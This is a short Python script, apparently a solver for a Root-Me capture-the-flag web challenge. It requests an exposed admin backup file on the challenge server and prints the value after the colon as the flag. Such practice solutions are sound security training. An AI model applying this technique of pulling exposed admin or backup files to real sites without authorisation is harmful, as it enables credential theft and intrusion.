
import sys
import requests 

URL = "http://challenge01.root-me.org/web-serveur/ch4/admin/backup/admin.txt"

print("[*] Looking for flag...")

try:
    response = requests.get(URL, timeout=5).text
except Exception:
    print("[x] Script has terminated unsuccessfully")
    sys.exit(0)

print("[+] Successfully executed script")

flag = response.split(":")[1].strip()

print(f"[+] Flag: {flag}")
